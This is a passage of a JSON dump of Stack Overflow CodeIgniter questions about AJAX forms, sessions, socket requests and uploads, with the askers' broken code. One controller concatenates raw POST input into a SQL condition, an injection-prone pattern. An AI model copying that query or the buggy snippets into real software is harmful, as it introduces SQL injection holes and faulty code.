<code>alert(data)</code> nor <code>alert(data.work_product_name)</code> are not displayed.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["php","jquery","ajax","codeigniter","frameworks"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1305,"score":1,"question_id":6809841,"title":"jQuery with Codeigniter AJAX Post problem","body":"<p>I've been trying to figure this out, but it seems to be harder than i first thought. However, what I'm trying to do is make an ajax post request, but the POST seems to be empty when I'm sending it.</p>\n\n<p><strong>My HTML File</strong></p>\n\n<pre><code>    &lt;div id=\"statusUpdate\"&gt;\n        &lt;?php echo form_open(base_url() . 'profile/statusUpdate', array('id' =&gt; 'statusUpdateForm', 'name' =&gt; 'statusUpdateForm')); ?&gt;\n            &lt;input type=\"text\" value=\"Hva tenker du på?\" name=\"profileUpdate\" id=\"profileUpdate\" onfocus=\"if(this.value == 'Hva tenker du på?')this.value=''\" onblur=\"if(this.value == '')this.value='Hva tenker du på?'\" /&gt;\n            &lt;input type=\"submit\" value=\"\" name=\"profileUpdateButton\" id=\"profileUpdateButton\" /&gt;\n        &lt;?php echo form_close(); ?&gt;\n    &lt;/div&gt;\n</code></pre>\n\n<p><strong>My Javascript</strong></p>\n\n<pre><code>        $('#statusUpdateForm').submit(function() {\n\n        $.ajax({ // Starter Ajax Call\n\n            method: \"POST\", \n            url: baseurl + 'profile/statusUpdate', \n            data: $('#statusUpdateForm').serialize(),\n            success: function(data) { \n                alert(data);\n            }\n\n        });\n\n        return false;\n\n    });\n</code></pre>\n\n<p><strong>My PHP (Some of my medhod in the controller)</strong></p>\n\n<pre><code>    // Check if the input is a ajax request\n    if($this-&gt;input-&gt;is_ajax_request()) {\n        echo $_POST['profileUpdate'];\n    }\n</code></pre>\n\n<p>Notice, when i put echo \"Hello World\" etc in the controller, i do get \"Hello World\" in the alert box from the javascript.</p>\n\n<p>I've also tried a var_dump on $_POST and it returns <em>array(0){}</em> When I'm trying to output the specific $_POST['profileUpdate'] variable i get an error like this,</p>\n\n<p><img src=\"http://i.stack.imgur.com/fymp0.png\" alt=\"enter image description here\"></p>\n\n<p>I've also done a alert from the seralize function i JS, this is what i got,</p>\n\n<p><img src=\"http://i.stack.imgur.com/WrPIv.png\" alt=\"enter image description here\"></p>\n\n<p>Is there anyone who know how i can fix this problem? </p>\n"},{"tags":["jquery","ajax","codeigniter","modal-dialog"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1541,"score":0,"question_id":10427596,"title":"Submit form via jquery modal to codeigniter controller","body":"<p>I had a problem on submitting the form thru ajax jquery. My problem is, how to submit the jquery modal form to the codeigniter controller without refresh the page? at the same time, if the submitted data contains an error from codeigniter controller (validation), how the jquery will show the error message?</p>\n\n<p>here is my code</p>\n\n<p><strong>js script</strong></p>\n\n<pre><code>$(function() {\n\n// Dialog\n$('#dialog').dialog({\n    autoOpen: false,\n    width: 380,\n    height:300,\n    buttons: {\n        'Save': function() {\n\n  function submitForm(){\n\n  $.ajax({\n  type : 'POST',\n  url : 'http://localhost/hmvc/index.php/sysconfig/sysmenu/create',\n  data : $('#menu_form').serialize(),\n  success : function(data) {\n      // Show OK message\n      alert('ok');\n  },\n  error: function(error){\n      // Show error message\n      alert('error');\n  }\n});\n\nreturn false;\n}\n\n        },\n        'Cancel': function() {\n            $(this).dialog(\"close\");\n        }\n    } \n }); \n\n// Dialog Link\n$('#dialog_link').click(function(){\n    $('#dialog').dialog('open');\n    return false;\n}); \n\n\n});\n</code></pre>\n\n<p><strong>controller</strong></p>\n\n<pre><code>function _validate()\n{\n    $config = array(\n\n                array(\n                'field'=&gt;'sysmenu_name',\n                'label'=&gt;'menu name',\n                'rules'=&gt;'trim|max_length[30]|htmlspecialchars|required|xss_clean'\n                ),\n\n                array(\n                'field'=&gt;'sysmenu_link',\n                'label'=&gt;'hyperlink',\n                'rules'=&gt;'trim|max_length[100]|htmlspecialchars|required|xss_clean'\n                ),\n\n                array(\n                'field'=&gt;'sysmenu_sequence',\n                'label'=&gt;'sequence',\n                'rules'=&gt;'trim|max_length[2]|htmlspecialchars|required|xss_clean'\n                )\n\n              );\n\n    $this-&gt;form_validation-&gt;set_rules($config);\n\n    $this-&gt;form_validation-&gt;set_error_delimiters('&lt;div class=\"error_msg\"&gt;', '&lt;/div&gt;');\n}\n\nfunction create()\n{\n  if($this-&gt;input-&gt;is_ajax_request())\n  {\n    $this-&gt;_validate();\n    if($this-&gt;form_validation-&gt;run($this)==FALSE)\n    {\n\n           echo validation_errors();\n    }\n\n\n    } else {\n\n        $menu_level = getValue_where('sysmenu_level',\"sysmenu_id ='\".$this-&gt;input-&gt;post('sysmenu_parent_id').\"'\",'base_sysmenu') + 1;\n\n        $data = array(\n                'sysmenu_name'=&gt;$this-&gt;input-&gt;post('sysmenu_name'),\n                'sysmenu_parent_id'=&gt;$this-&gt;input-&gt;post('sysmenu_parent_id'),\n                'sysmenu_link'=&gt;$this-&gt;input-&gt;post('sysmenu_link'),\n                'sysmenu_level'=&gt;$menu_level,\n                'sysmenu_sequence'=&gt;$this-&gt;input-&gt;post('sysmenu_sequence')\n                );\n\n        $this-&gt;sysmenu_model-&gt;insert_menu($data);\n        $this-&gt;index();\n    }\n}\n</code></pre>\n\n<p><strong>view</strong></p>\n\n<pre><code>&lt;div id=\"dialog\" title=\"&lt;?php echo $this-&gt;lang-&gt;line('add_new_menu') ?&gt;\"&gt;\n&lt;div class=\"notice_msg\"&gt;&lt;?php echo $this-&gt;lang-&gt;line('compulsary'); ?&gt;&lt;/div&gt;&lt;br /&gt;\n\n&lt;div class=\"errors\"&gt;&lt;!-- append the error message here --&gt;&lt;/div&gt;\n\n&lt;?php echo form_open('','class=normal_form name=create_menu id=menu_form'); ?&gt;\n&lt;label&gt;&lt;?php echo $this-&gt;lang-&gt;line('menu_name'); ?&gt;&lt;/label&gt;&lt;?php echo form_input('sysmenu_name'); ?&gt;*&lt;br /&gt;\n&lt;label&gt;&lt;?php echo $this-&gt;lang-&gt;line('parent_menu'); ?&gt;&lt;/label&gt;&lt;?php //echo form_input('sysmenu_parent_id'); ?&gt;&lt;?php echo form_dropdown('sysmenu_parent_id', dropdown_where('sysmenu_id','sysmenu_name',\"sysmenu_level = 1\",'base_sysmenu'), ''); ?&gt;&lt;br /&gt;\n&lt;label&gt;&lt;?php echo $this-&gt;lang-&gt;line('menu_link'); ?&gt;&lt;/label&gt;&lt;?php echo form_input('sysmenu_link'); ?&gt;*&lt;br /&gt;\n&lt;label&gt;&lt;?php echo $this-&gt;lang-&gt;line('menu_sequence'); ?&gt;&lt;/label&gt;&lt;?php echo form_input('sysmenu_sequence','','size=12, maxlength=2'); ?&gt;*&lt;br /&gt;\n&lt;label&gt;&amp;nbsp;&lt;/label&gt;&lt;?php //echo form_submit('data',$this-&gt;lang-&gt;line('btn_save')); ?&gt;\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n\n<p></p>\n"},{"tags":["php","codeigniter","search-engine","sitemap"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":4176,"score":3,"question_id":1317539,"title":"Sitemap for dynamic content?","body":"<p>I am developing a webapp using codeigniter (mvc) and php. I was wondering how do I create a sitemap for search engines when my contact is dynamic?  Are there best practices for this, or is there a way to automate the process? I ask because content will be constantly and rapidly added so I'd like the sitemap be recent.  Thanks</p>\n\n<p><strong>Update:</strong> to help answer my question, the type of site that I am creating is a public blog type site where users post articles.</p>\n\n<p><strong>Update2</strong>: Just to elaborate on my confusion: I may not understand exactly how a sitemap is structured.  On a site like stackoverflow for example, as users add new questions (and thus, new pages get created) does the sitemap change and need to be resubmitted?  How important is it for a site like this one to even have a sitemap?</p>\n"},{"tags":["php","codeigniter","zend-framework"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":175,"score":2,"question_id":12255888,"title":"How to combine zend framework and Codeigniter?","body":"<p>How to combine zend framework and Codeigniter ?</p>\n\n<p>I have two applications, one is zend and other one is codeigniter, is it possible to combine the two framework in to one project ? If so, How to combine the two framework and what are the  files structure for this ?</p>\n\n<p>Thank you for you help.</p>\n"},{"tags":["php","sql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":67,"score":1,"question_id":12555783,"title":"Checking if user is online or not (updating activity time on each page visit)","body":"<p>So basically, I have a cronjob, that will check user database activity time, and if user has not done anything in last 10 minutes, it will automatically logout user and set it's status to offline. </p>\n\n<p>Now about the hard part - On each user page visit, I'm doing an update to database, and inserting new activityTime, for example, if he visits homepage, database will automatically update, if he will go to users online page, again, the database will update e.c. That happens to all of users. </p>\n\n<p>So the question is - is there any other, better solutions, or this is good enough solution for that? </p>\n\n<p>Can it cause any troubles in long term, or will it reduce the website speed cause of too many db connections?</p>\n\n<p>Hope you understood what I ment :)!</p>\n"},{"tags":["php","performance","codeigniter","hmvc","scalable"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":1294,"score":2,"question_id":6313864,"title":"Codeigniter HMVC effect on performance","body":"<p>OK, so <a href=\"https://bitbucket.org/wiredesignz/codeigniter-modular-extensions-hmvc/wiki/Home\" rel=\"nofollow\">HMVC in Codeigniter</a> is the way to go for <a href=\"http://web.archive.org/web/20110713001121/http://techportal.ibuildings.com/2010/02/22/scaling-web-applications-with-hmvc/\" rel=\"nofollow\">scalable web applications (with Kohana 3)</a> based off many stackoverflow discussions such as <a href=\"http://stackoverflow.com/questions/2263416/what-is-the-hmvc-pattern/5736164#5736164\">HMVC patterns</a> and <a href=\"http://stackoverflow.com/questions/5454337/mvc-vs-hmvc-for-web-application-development\">MVC vs HMVC</a>.  </p>\n\n<p>But, how will using an HMVC approach affect performance when used in Codeigniter?  From my understanding, HMVC will \"simulate a controller\".  Assuming a one day \"large\" scale project, will Codeigniter's implementation by a future problem?</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":621,"score":0,"question_id":10509022,"title":"CodeIgniter: unset all userdata, but not destroy the session","body":"<p>Is there a way to unset ALL userdata in a session without having to use session destroy? I'm trying to log my user out and need to unset all userdata one at a time. It's becoming tedious to keep track of all possible userdata set in session. I just want to unset everything that might have been set in userdata.</p>\n"},{"tags":["php","codeigniter","codeigniter-datamapper"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":124,"score":1,"question_id":10086228,"title":"CodeIgniter and DataMapper ORM","body":"<p>I am using the basic login manager that is in the example bugs application but my main admin controller now has about 25 functions in it and at the start of every function i need to call </p>\n\n<pre><code> $this-&gt;login_manager-&gt;check_login(1);\n</code></pre>\n\n<p>Is there a simple way of having this check done automatically in every function or will I have to go down the MY_Controller route and then inherit from that. </p>\n\n<p>My current constructor looks like this </p>\n\n<pre><code>class Admin extends CI_Controller\n {\n\nfunction __construct()\n{\n    parent::__construct();\n    $this-&gt;load-&gt;library('login_manager', array('autologin' =&gt; FALSE, 'required_group' =&gt; 1));\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter","zend-framework","session","logic"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12559644,"title":"How to get/pass session values from Zend to Codeignitor in PHP","body":"<p>My parent application devoloped in Zend Framework and now I would like to creates its child application with Codeignitor under same server with domain such as follows,</p>\n\n<p>Parent url as,</p>\n\n<pre><code>www.example.com \n</code></pre>\n\n<p>Child url as</p>\n\n<pre><code>www.first.example.com\n</code></pre>\n\n<p>How to redirect all logined users under parent site(www.example.com ) to child site (www.first.example.com) with their session values. I am not sure is it possible? I need all of your help and support to overcome this issue.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["codeigniter","smf","bridge"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12558570,"title":"how to integrate SMF with CodeIgniter?","body":"<p>I am working on a project that will solely use the SMF member system.  Meaning that SMF is the only member system that I am using to have logins, not my own system along with SMF, just plain SMF.  However, I am running into one problem... I need  to be able to get information from SMF based on a given ID_MEMBER.  My article database uses SMF's ID_MEMBER field as the author information.  Seeing that CodeIgniter is MVC and uses classes, I searched for a general SMF class all over the internet, but could not find one.  I decided to write my own, but cannot get it to work correctly... I don't have much experience with OOP.  </p>\n\n<p><code></p>\n\n<pre><code>&lt;?php\n\nclass smf {\n\n    var $context;\n    var $memberContext;\n\n    function __construct($who){\n\n        include('/../../forums/SSI.php');\n        $this-&gt;context = $context;\n    }\n\n    function user_context(){\n\n        return $this-&gt;context['user'];\n\n    }\n\n    function member_context($id = NULL){\n\n        loadMemberData($id);\n        loadMemberContext($id);\n        return $memberContext[$id];    \n    }\n</code></pre>\n\n<p>}</code></p>\n\n<p>The user_context function works fine, but not the member_context function.  In the SSI.php file, the LoadmemberContext function compiles all of the information into an array called $memberContext[$id].  When I call the method from my CodeIgniter controller, I get an error saying that the $memberContext variable is undefined.  Why is this happening?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12558128,"title":"I am trying to fetch data from db in CodeIgniter but getting errors","body":"<p>Here is my code.</p>\n\n<p>Controller function</p>\n\n<pre><code>function index()\n{\n      $data['message'] = (validation_errors()) ? validation_errors() : $this-&gt;session-&gt;flashdata('message');\n\n      $this-&gt;load-&gt;model('customers_model');\n      $data['rows'] = $this-&gt;customers_model-&gt;getAll();\n\n      $meta['page_title'] = 'Customers';\n      $data['page_title'] = 'Customers';\n      $this-&gt;load-&gt;view('../header', $meta);\n      $this-&gt;load-&gt;view('content', $data);\n      $this-&gt;load-&gt;view('../footer');\n}\n</code></pre>\n\n<p>Model function</p>\n\n<pre><code>public function getAll() \n{\n        $q = $this-&gt;db-&gt;get('customers');\n\n        if($q-&gt;num_rows() &gt; 0) {\n            foreach ($q-&gt;result() as $row) {\n                $data[] = $row;\n            }\n\n            return $data;\n        }\n}\n</code></pre>\n\n<p>View File</p>\n\n<pre><code>&lt;table cellpadding=0 cellspacing=10 width=\"100%\"&gt;\n    &lt;thead&gt;\n        &lt;tr&gt;\n            &lt;th&gt;Name&lt;/th&gt;\n            &lt;th&gt;Company&lt;/th&gt;\n            &lt;th&gt;Phone&lt;/th&gt;\n            &lt;th&gt;Email&lt;/th&gt;\n            &lt;th&gt;Address&lt;/th&gt;\n            &lt;th&gt;City&lt;/th&gt;\n            &lt;th&gt;Code&lt;/th&gt;\n            &lt;th&gt;State&lt;/th&gt;\n            &lt;th&gt;Country&lt;/th&gt;\n        &lt;/tr&gt;\n    &lt;/thead&gt;\n    &lt;tbody&gt;\n        &lt;?php foreach ($data as $row):?&gt;\n            &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;name; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;company; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;phone; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;email; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;address; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;city; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;postal_code; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;state; ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo $row-&gt;country; ?&gt;&lt;/td&gt;\n            &lt;/tr&gt;\n        &lt;?php endforeach;?&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n</code></pre>\n\n<p>I am getting errors</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: Notice\nMessage: Undefined variable: data\nFilename: views/content.php\n\nA PHP Error was encountered\nSeverity: Warning\nMessage: Invalid argument supplied for foreach()\nFilename: views/content.php\n</code></pre>\n\n<p>I am using CI first time and have no idea what am I doing wrong. Please help.</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12555765,"title":"Organizing URI segments in codeigniter","body":"<pre><code>function orders(){\n\n        $order_id = $this-&gt;uri-&gt;segment(3);\n\n        if($order_id){\n            $data['main_content'] = \"admin-order-page\";\n            $data['order_id'] = $order_id;\n            $this-&gt;load-&gt;view(\"includes/cp-template\",$data);\n        }else{\n            $data['main_content'] = \"admin-orders\";\n            $this-&gt;load-&gt;view(\"includes/cp-template\",$data);\n        }\n\n\n\n    }\n</code></pre>\n\n<p>Above is my orders method in my controller, so www.myexample.com/orders</p>\n\n<p>I'm wondering what is the proper way of handling information passed in the url. In my example, you have just /orders going to a particular view, and if a id is appended, /orders/23, it will go to a product page. </p>\n\n<p>I now want to add pagination on my /orders view, and will want to pass the page number in the url, like /orders/page/2. Should I just add some more logic looking for the uri of \"page\"? </p>\n\n<p>Is there a better way of organizing all of this?</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":105,"score":4,"question_id":12556913,"title":"Codeigniter Undefined Property, or how will my controller stop worrying and learn to love the model","body":"<p>I am following the tutorial from the <a href=\"http://codeigniter.com/user_guide/tutorial/news_section.html\" rel=\"nofollow\">Codeigniter website</a> about making a news section. Right now I am getting an undefined property message on line 13.</p>\n\n<p>Here is my model. <strong>applications/models/articles_model</strong></p>\n\n<pre><code>&lt;?php\n\nclass Articles_model extends CI_Model{\n\n    public function __construct(){\n\n        $this-&gt;load-&gt;database();\n    }\n\n    public function get_article($slug = False){\n\n        if ($slug === FALSE){\n\n             $query = $this-&gt;db-&gt;get('articles');\n             return $query-&gt;result_array();\n        }\n\n        $query = $this-&gt;db-&gt;get('articles');\n        return $query-&gt;result_array();\n    }\n\n    $query = $this-&gt;db-&gt;get_where('articles', array('slug' =&gt; $slug));\n    return $query-&gt;row_array();\n}\n</code></pre>\n\n<p>And here is the controller. <strong>applications/controllers/articles.php</strong></p>\n\n<pre><code>&lt;?php\n\nclass Articles extends CI_Controller{\n\n    public function __contruct(){\n\n        parent::__construct();\n        $this-&gt;load-&gt;model('Articles_model');\n    }\n\n    public function index(){\n\n        //Message: Undefined property Articles::Articles_model    \n        $data['articles'] = $this-&gt;Articles_model-&gt;get_article();\n        $data['title'] = \"Archive\";\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('articles/index', $data);\n        $this-&gt;load-&gt;view('templates/footer');\n    }\n\n    public function view($slug){\n\n        $data['articles'] = $this-&gt;Articles_model-&gt;get_article($slug);\n\n        if(empty($data['articles'])){\n\n            show_404();\n        }\n\n        $data['title'] = $data['articles']['title'];\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('articles/view', $data);\n        $this-&gt;load-&gt;view('templates/footer');\n    }\n}\n</code></pre>\n\n<p>These are all the routes I have setup. <strong>applications/config/routes.php</strong></p>\n\n<pre><code>$route['articles/(:any)'] = 'articles/view/$1';\n$route['articles'] = 'articles';\n$route['default_controller'] = 'pages/view';\n$route['(:any)'] = 'pages/view/$1';\n</code></pre>\n\n<p>My database looks like this</p>\n\n<pre><code>mysql&gt; describe articles\n+-------+--------------+------+-----+---------+----------------+\n| Field | Type         | Null | Key | Default | Extra          |\n+-------+--------------+------+-----+---------+----------------+\n| id    | int(11)      | NO   | PRI | NULL    | auto_increment |\n| title | varchar(128) | NO   |     | NULL    |                |\n| slug  | varchar(128) | NO   | MUL | NULL    |                |\n| text  | text         | NO   |     | NULL    |                |\n+-------+--------------+------+-----+---------+----------------+\n</code></pre>\n\n<p>I have tried using the property with a capital first-letter,<code>$this-&gt;Articles_model</code>, and not, <code>$this-&gt;articles_model</code>.  </p>\n\n<p>Am I missing something stupid?\nIf so what is it?<br>\nIf it's not stupid how can I debug?</p>\n\n<p><strong>EDIT</strong>  </p>\n\n<p>The ouput of print_r, as per comments, did not contain \"Articles_model\". The first tier thing is over my head, but CTRL-F isn't. Also the Apache logs mention this...</p>\n\n<pre><code>[Sun Sep 23 13:19:30 2012] [error] [client 127.0.0.1] PHP Fatal error:  Call to a member function get_article() on a non-object in /home/noel/dev/web/\nci/CodeIgniter_2.1.2/application/controllers/articles.php on line 13\n</code></pre>\n\n<p><strong>EDIT1</strong></p>\n\n<p>I thought I fixed it, but no, see the comment on my <em>answer</em>. For some reason <code>$this-&gt;article_model</code> is not an object. </p>\n\n<p>Why? I've been to one World Fair, a Picnic and a Rodeo and that's the stupidest thing I ever heard come over a set of earphones. You sure you got today's codes?</p>\n"},{"tags":["php","codeigniter","sockets","fgets","fsockopen"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12523680,"title":"fgets() timing out","body":"<p>I've got a problem with part of a CodeIgniter-based application I'm building.</p>\n\n<p>I have to connect to a remote server and have a reasonably detailed set of instructions from the third-party about how to open a socket, send some XML data and receive a response - in VB script. I've translated this into the PHP code below. At the moment, according to my log, data is being written to the server (the log output is shown below). However the fgets() part of the code just seems to be timing out, with no errors or anything... makes things pretty hard to debug. </p>\n\n<p>From what I've read about <a href=\"http://php.net/manual/en/function.fsockopen.php\" rel=\"nofollow\">fsockopen()</a> and <a href=\"http://php.net/manual/en/function.fgets.php\" rel=\"nofollow\">fgets()</a>, the following should work, but obviously it doesn't. The problem is with no error messages etc to go on, I'm at a bit of a loss as to how to debug it.</p>\n\n<p>I would appreciate it if anyone who has a spare minute could cast an eye over it just to see if I've made an obvious mistake (or to confirm that what I'm doing is correct for that matter).</p>\n\n<p>Here's the code (I've had to blank out some of it sorry).</p>\n\n<pre><code>public function makeBooking($orderId) {\n\n    // get entire XML file as a string\n    $xmlString = $this-&gt;getXmlString();\n\n    // replace non-alphanumeric characters\n    $xmlString = $this-&gt;replaceChars($xmlString);\n\n    // get length of xml string\n    $xmlStrCount = mb_strlen($xmlString) + 7;\n\n    // attempt to open socket\n    $fp = fsockopen('xxx.xx.xxx.xx', '81', $errno, $errstr, 10); \n\n    if (!$fp) {\n\n        // couldn't open socket\n        log_message('ERROR', \"*** Couldn't open socket: $errno $errstr \" . ' | line ' . __LINE__ . ' of ' . __FILE__);\n\n    } else {\n\n        log_message('DEBUG', \"*** Socket open, connected to remote server \");\n\n        $lf = chr(13).chr(10);\n\n        // opened socket, prepare output\n        $output = '\"POST xxxxxxxxxxxx.asp HTTP/1.0\"' . $lf;\n        $output .= '\"Accept: */*\"' . $lf;                                            \n        $output .= '\"User-Agent: xxxxxxxxxxx_socket/1.0\";' . $lf;\n        $output .= '\"Content-type: application/x-www-form-urlencoded\";' . $lf;\n        $output .= '\"Content-length: ' . $xmlStrCount . '\";' . $lf;\n        $output .= '\"\"' . $lf;\n        $output .= '\"xml_in='.$xmlString.'\"';\n\n        // attempt to write output\n        $result = fwrite($fp, $output);\n        log_message('DEBUG', \"***  Bytes written: $result \" . ' | line ' . __LINE__ . ' of ' . __FILE__);\n        if($result) {\n            log_message('DEBUG', \"*** Wrote output:$lf$lf$output$lf\");\n        } else {\n            log_message('ERROR', \"*** Failed to write output:$lf$lf$output$lf\");\n        }\n\n\n        // read data from server until no more responses are sent            \n        // while (!feof($fp)) {\n        if(!feof($fp)) {\n            log_message('DEBUG',\"*** Requesting line 1 from remote server\" );\n           //$line = fgets($fp);\n            $line = fgets($fp);\n            if($line) {\n                log_message('DEBUG',\"*** Retreived line 1: \" . print_r($line,TRUE) );\n            } else {\n                log_message('ERROR',\"*** Could not retreive line 1\" );\n            }\n        }\n        fclose($fp);\n        log_message('DEBUG',\"*** Closed connection to remote server\" );\n    }\n\n}\n</code></pre>\n\n<p>The log. Obviously a lot of it is how I've interpreted the associated results. I've truncated the URL encoded XML data:</p>\n\n<pre><code>    DEBUG - 2012-09-21 14:50:01 --&gt; *** Socket open, connected to remote server \nDEBUG - 2012-09-21 14:50:01 --&gt; ***  Bytes written: 8801  | line 57\nDEBUG - 2012-09-21 14:50:01 --&gt; *** Wrote output:\n\n\"POST xxxxxxxxxxxx.asp HTTP/1.0\"\n\"Accept: */*\"\n\"User-Agent: xxxxxxxxxxxxx_socket/1.0\";\n\"Content-type: application/x-www-form-urlencoded\";\n\"Content-length: 8630\";\n\"\"\n\"xml_in=%26lt%3B%3Fxml+version%3D%26quot%3B1.0%26quot%3B...\"\nDEBUG - 2012-09-21 14:50:01 --&gt; *** Requesting line 1 from remote server\nERROR - 2012-09-21 14:51:01 --&gt; *** Could not retreive line 1\nDEBUG - 2012-09-21 14:51:01 --&gt; *** Closed connection to remote server\n</code></pre>\n\n<p>Any ideas of where to look would be much appreciated. </p>\n\n<p>-------------- EDIT --------------</p>\n\n<p>Just incase anyone stumbles across this thread with a similar issue, here's what I did in the end, based on robbie's suggestions:</p>\n\n<pre><code>public function createBooking($orderId) {\n\n    // http://php.net/manual/en/book.curl.php\n\n    // get entire XML file as a string\n    $xmlString = $this-&gt;getXmlString();\n\n    // replace non-alphanumeric characters - can't use htmlentities or htmlspecialchars\n    // because remote server uses different codes\n    $xmlString = $this-&gt;replaceChars($xmlString);\n\n    // get length of xml string\n    $xmlStrCount = mb_strlen($xmlString) + 7;\n\n    // prepare output\n    $lf = chr(13).chr(10);\n    $output = '\"Accept: */*\"' . $lf;                                            \n    $output .= '\"User-Agent: xxxxx_socket/1.0\";' . $lf;\n    $output .= '\"Content-type: application/x-www-form-urlencoded\";' . $lf;\n    $output .= '\"Content-length: ' . $xmlStrCount . '\";' . $lf;\n    $output .= '\"\"' . $lf;\n    $output .= '\"xml_in='.$xmlString.'\"';\n\n    // set curl options\n    $ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL,\"http://xxxxx:xx/xxxxx.asp\");\n    curl_setopt($ch, CURLOPT_POST, 1);\n    curl_setopt($ch, CURLOPT_POSTFIELDS, $output);\n    // Request the header information in the response. \n    curl_setopt($ch,CURLOPT_HEADER,true);\n    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n\n    // Now execute the query\n    $response = curl_exec ($ch);\n    if(!$response) {\n        log_message('ERROR', \"*** Curl error: \" . curl_error($ch) . ' | line ' . __LINE__ . ' of ' . __FILE__);\n        show_error(DEFAULT_ERR_MSG);\n    }\n    curl_close ($ch);\n\n\n\n    // Response is the data. \n    $aLines = explode(\"\\n\", $response);  // Splits the resposne into an array so you can process individual lines.\n    // etc\n\n    print_r($aLines);\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12556000,"title":"Codeigniter file uploader class - filename as date & time","body":"<p>I am trying to amend codeigniters' file uploader class so the filename of every file is the date &amp; time, regardless of the filetype uploaded.</p>\n\n<p>My current upload function is:</p>\n\n<pre><code>        function do_upload()\n    {\n        $config['upload_path'] = './uploads/';\n        $config['allowed_types'] = 'gif|jpg|png';\n        $config['max_size'] = '2048';\n        $config['max_width']  = '1624';\n        $config['max_height']  = '1268';\n        $config['file_name']  = substr(md5(time()), 0, 28);\n\n        $this-&gt;load-&gt;library('upload', $config);\n\n        if ( ! $this-&gt;upload-&gt;do_upload())\n        {\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors());\n\n        }\n        else\n        {\n            $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n            $this-&gt;load-&gt;view('upload_success', $data);\n        }\n    }\n</code></pre>\n\n<p>Any suggestions much appreciated.</p>\n"},{"tags":["php","codeigniter","calendar"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":394,"score":3,"question_id":9230924,"title":"Generate a 2 week view with Codeigniter's Calendar library from current week","body":"<p>I'm trying to make a 2 week view with Codeigniter's calendar library, basically I don't need a full month view, instead I'd like to have a 2 week view from the current week. </p>\n\n<p><img src=\"http://i.stack.imgur.com/1uOWZ.png\" alt=\"enter image description here\"></p>\n\n<p>The image above shows similarity what I want to achieve. On the templating side of Codeigniter when generating does not offer this kind of feature. I do not want to use jQuery UI's calendar due to I need a static calendar instead of relying on JS to perform this (especially when users have disabled JS).</p>\n\n<p>Is there a specific extended library I can merge with Codeigniter's or a specific template string that can perform this type of calendar view?</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12555960,"title":"codeigniter where to put email functions","body":"<p>Suppose I have a bunch of \"email\" functions- like a user signup confirmation or password recovery email, or a notifications update email. Where can I \"place\" these functions? My original idea was to simply keep them in the controllers, but I'd rather have a common place. Then my idea was to create a new controller specifically for emails, but that breaks the MVC pattern, and my last idea was to extend the email_helper.php helper, but if I do that, I can't do something like </p>\n\n<p><code>$this-&gt;email-&gt;to($email);</code> </p>\n\n<p>because I get an error that reads </p>\n\n<p><code>Fatal error: Using $this when not in object context in /Applications/XAMPP/xamppfiles/htdocs/elluminate/system/helpers/email_helper.php on line 71</code></p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":34,"score":-1,"question_id":12555559,"title":"Codeigniter get one column with this->db->like()","body":"<p>I'm trying to do a search in a table with LIKE utility.There are 8 column in the table but i need one of them. So that I should get one column. How can i do that with codeigniter?</p>\n"},{"tags":["codeigniter","plugins","wordpress-plugin","hmvc"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12553134,"title":"extend existing codeigniter app using hmvc or creating plugin system","body":"<p>what is the best way to EXTEND an existing CI app using 